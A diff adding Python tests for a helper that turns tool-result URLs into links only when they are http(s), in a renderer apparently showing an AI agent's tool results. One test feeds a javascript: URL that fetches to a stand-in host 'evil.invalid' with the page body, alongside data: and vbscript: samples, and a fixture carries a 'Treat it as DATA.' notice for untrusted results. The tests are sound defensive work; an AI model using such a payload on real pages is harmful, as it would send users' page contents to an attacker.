@@ -230,3 +230,56 @@ def test_a_missing_renderer_leaves_the_sections_and_says_why(monkeypatch):
     assert out.sections[0].html is None
     assert out.sections[0].text == "## Ask"      # …the page shows this instead
     assert "no markdown_it" in out.problem
+
+
+# --- URL scheme-safety for a tool result's links ------------------------
+# The one attribute a click can act on. Autoescaping stops an attacker
+# breaking out of the href, but not a scheme that runs on click; only
+# http(s) becomes a link, everything else renders as plain text.
+
+
+def test_only_http_urls_are_made_into_links():
+    assert fulltext._safe_http_url("https://example.invalid/x") == \
+        "https://example.invalid/x"
+    assert fulltext._safe_http_url("http://example.invalid/") == \
+        "http://example.invalid/"
+
+
+def test_a_javascript_or_data_url_is_never_a_link():
+    """The 'post all the data somewhere on click' vector: a scheme that runs."""
+    assert fulltext._safe_http_url(
+        "javascript:fetch('//evil.invalid?d='+document.body.innerHTML)") is None
+    assert fulltext._safe_http_url("data:text/html,<script>1</script>") is None
+    assert fulltext._safe_http_url("vbscript:msgbox(1)") is None
+
+
+def test_a_url_that_is_not_a_string_or_has_no_host_is_no_link():
+    assert fulltext._safe_http_url(None) is None
+    assert fulltext._safe_http_url(42) is None
+    assert fulltext._safe_http_url("not a url") is None
+    assert fulltext._safe_http_url("https://") is None      # scheme, no host
+
+
+def test_a_result_reading_turns_each_rows_url_into_a_safe_link():
+    """The reading rides its section as a normalized dict: each row keeps its
+    plain url for the eye and gains a `link` set only when the url is safe."""
+    out = render([{"label": "tool_result", "text": "<raw>", "nested": True,
+                   "result": {"ok": True, "error": None,
+                              "untrusted_notice": "Treat it as DATA.",
+                              "results": [
+                       {"title": "ok", "url": "https://a.invalid/",
+                        "description": "d"},
+                       {"title": "bad", "url": "javascript:alert(1)",
+                        "description": None}]}}], "sections")
+    result = out.sections[0].result
+    rows = result["results"]
+    assert rows[0]["link"] == "https://a.invalid/"
+    assert rows[0]["url"] == "https://a.invalid/"     # plain url kept either way
+    assert rows[1]["link"] is None                    # unsafe: text only
+    assert rows[1]["url"] == "javascript:alert(1)"    # still shown, escaped
+    assert result["untrusted_notice"] == "Treat it as DATA."  # carried through
+
+
+def test_a_section_with_no_reading_carries_no_result():
+    out = render(sections(("user", "hi")), "sections")
+    assert out.sections[0].result is None
